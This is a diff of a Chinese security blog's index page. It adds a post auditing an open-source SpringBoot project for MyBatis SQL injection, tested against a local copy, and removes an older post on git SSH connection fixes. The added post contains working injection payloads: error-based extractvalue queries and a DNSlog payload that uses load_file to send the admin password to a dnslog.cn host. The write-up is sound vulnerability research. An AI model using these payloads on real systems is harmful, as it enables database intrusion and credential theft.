@@ -55,6 +55,86 @@
       <div id="middlecontent" title class="global-width sidebar-right">
         <section id="main">
   
+    <article id="post-某个SpringBoot项目的审计" class="article global-container article-type-post" itemscope itemprop="blogPost">
+  
+    <header class="article-header">
+      
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/06/05/某个SpringBoot项目的审计/">某个SpringBoot项目的审计</a>
+    </h1>
+  
+
+    </header>
+  
+  <div class="article-meta">
+    <a href="/2021/06/05/某个SpringBoot项目的审计/" class="article-date">
+  <time datetime="2021-06-05T03:10:39.000Z" itemprop="datePublished">2021-06-05</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/WEB相关/">WEB相关</a>
+  </div>
+
+    
+  </div>
+  
+
+  <div class="article-inner">
+    
+    <div class="article-content article-content-cloud" itemprop="articleBody">
+      
+        <h1 id="某个SpringBoot项目的审计"><a href="#某个SpringBoot项目的审计" class="headerlink" title="某个SpringBoot项目的审计"></a>某个SpringBoot项目的审计</h1><p>在github上看到的这个SpringBoot项目，作者刚提交不久，一些功能还没完善。好奇心让我下载了这个项目，打算在本地审计一波，遂有了此文。</p>
+<p>拿到一个java的项目，我习惯先看是什么框架。持久层用的什么，然后是maven项目的话，pom文件里的依赖都是哪些，版本又是如何。再就是看项目里filter对参数的过滤情况。</p>
+<h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><ul>
+<li>第一处注入</li>
+</ul>
+<p>项目的持久层用的mybatis，这里我就直接查看项目里的sql映射文件，看到这一处sql语句，${sql}完全可控，明显一处注入</p>
+<p><img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614131759313.png" alt="image-20210614131759313"></p>
+<p>一路跟上去看看有没有调用的</p>
+<p>，<img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614132523077.png" alt="image-20210614132523077"></p>
+<p><img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614132822231.png" alt="image-20210614132822231"></p>
+<p>可惜的是，作者唯独没调用这个getAreaBySql，应该是项目还没完善吧。为了验证一下这里的问题，我在controller里自己加了一处调用该函数。</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(&quot;/getAreaBySql&quot;)</span><br><span class="line">public RespDto&lt;List&lt;AreaReturnDto&gt;&gt;  getArea(@RequestParam(&quot;sql&quot;)String sql)&#123;</span><br><span class="line">	List&lt;AreaReturnDto&gt; list=areaService.getAreaBySql(sql);</span><br><span class="line">	return RespDto.succResult(list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>小小的尝试</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">sql=(select 1  and extractvalue(1,concat(0x7e,user())))</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614133459925.png" alt="image-20210614133459925"></p>
+<p>拿到结果，不过这里需要在控制台里才能看到结果，实战中应尝试dnslog拿结果，前提是对方的mysql secure_file_priv不为null，有load_file的权限</p>
+<p><img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614133554737.png" alt="image-20210614133554737"></p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dnslog payload</span><br><span class="line">sql=(select load_file(concat(&apos;\\\\&apos;,(select password from sys_member_info where user_name=&apos;admin&apos;),&apos;.4i06oo.dnslog.cn\\test&apos;)))</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614133917547.png" alt="image-20210614133917547"></p>
+<p>拿到结果</p>
+<p><img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614134001374.png" alt="image-20210614134001374"></p>
+<ul>
+<li><p>第二处注入</p>
+<p>这两个参数任选其一即可</p>
+<p><img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614195231427.png" alt="image-20210614195231427"></p>
+<p>看看哪里调用了</p>
+<p><img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614195501756.png" alt="image-20210614195501756"></p>
+<p><img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614195539485.png" alt="image-20210614195539485"></p>
+</li>
+</ul>
+<p>  <img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614195420133.png" alt="image-20210614195420133"></p>
+<p>找到调用的，直接开干，这里需要注意传的数据要是json的，不然得不到结果，也就是下面的enctype那里</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">http://localhost:8888/chongzhilog/list</span><br><span class="line">&#123;&quot;page&quot;:1,&quot;limit&quot;:10,&quot;id&quot;:&quot;1&quot;,&quot;startTime&quot;:&quot;1&apos;,&apos;2&apos;,&apos;00:00:00&apos;) and extractvalue(1,concat(0x7e,user()))--+&quot;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614195827125.png" alt="image-20210614195827125"></p>
+<p>得到结果</p>
+<p><img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614200012714.png" alt="image-20210614200012714"></p>
+<p>同样的可以尝试用dnslog拿到结果</p>
+
+      
+    </div>
+    
+  </div>
+  
+  
+</article>
+
+  
     <article id="post-某个SpringBoot系统的审计" class="article global-container article-type-post" itemscope itemprop="blogPost">
   
     <header class="article-header">
@@ -609,63 +689,6 @@ __toString()函数是当对象被当做字符串的时候会自动调用该函�
 </article>
 
   
-    <article id="post-git-ssh连不上github问题" class="article global-container article-type-post" itemscope itemprop="blogPost">
-  
-    <header class="article-header">
-      
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/10/04/git-ssh连不上github问题/">git ssh连不上github问题</a>
-    </h1>
-  
-
-    </header>
-  
-  <div class="article-meta">
-    <a href="/2019/10/04/git-ssh连不上github问题/" class="article-date">
-  <time datetime="2019-10-04T14:47:24.000Z" itemprop="datePublished">2019-10-04</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/杂记/">杂记</a>
-  </div>
-
-    
-  </div>
-  
-
-  <div class="article-inner">
-    
-    <div class="article-content article-content-cloud" itemprop="articleBody">
-      
-        <p>开始的时候是可以连上的，后来不知道怎么的就不行了，，，网上找了好久终于解决了，，这里我整理了一下这些问题</p>
-<h1 id="第一种情况"><a href="#第一种情况" class="headerlink" title="第一种情况"></a>第一种情况</h1><ul>
-<li>ping不了github.com<br>到本地hosts文件中添加一条github记录，并且删除.ssh中的known_hosts文件<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.30.255.112 github.com git </span><br><span class="line">185.31.16.184 github.global.ssl.fastly.net</span><br></pre></td></tr></table></figure></div>
-
-</li>
-</ul>
-<p>然后本地ping通了github，，，遂解决了连接不上的问题</p>
-<h1 id="第二种情况"><a href="#第二种情况" class="headerlink" title="第二种情况"></a>第二种情况</h1><ul>
-<li>22端口被占用<br>在.ssh文件夹中添加一个config文件，内容为：<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">User git</span><br><span class="line">Hostname ssh.github.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line">Port 443</span><br></pre></td></tr></table></figure></div>
-
-</li>
-</ul>
-<h1 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h1><ul>
-<li>ssh key失效了<br>删除.ssh，重新进行配置<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;yournamne&quot;</span><br><span class="line">git config --global user.email &quot;youremail&quot;</span><br><span class="line">ssh-keygen -t rsa -C &quot;youremail&quot;</span><br><span class="line">将.ssh中id_rsa.pub中的内容复制到github中ssh and gpg keys</span><br></pre></td></tr></table></figure></div>
-
-</li>
-</ul>
-<p>然后尝试连接 ssh -T <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>，输入yes，，如果出现success，就代表连接成功</p>
-
-      
-    </div>
-    
-  </div>
-  
-  
-</article>
-
-  
 
 
   <nav id="page-nav">
@@ -724,6 +747,10 @@ __toString()函数是当对象被当做字符串的时候会自动调用该函�
       <ul>
         
           <li>
+            <a href="/2021/06/05/某个SpringBoot项目的审计/">某个SpringBoot项目的审计</a>
+          </li>
+        
+          <li>
             <a href="/2021/06/05/某个SpringBoot系统的审计/">某个SpringBoot项目的审计</a>
           </li>
         
@@ -737,10 +764,6 @@ __toString()函数是当对象被当做字符串的时候会自动调用该函�
         
           <li>
             <a href="/2019/10/24/CVE-2019-11043-复现/">CVE-2019-11043 复现</a>
-          </li>
-        
-          <li>
-            <a href="/2019/10/23/WiFi网络结构/">WiFi网络结构</a>
           </li>
         
       </ul>
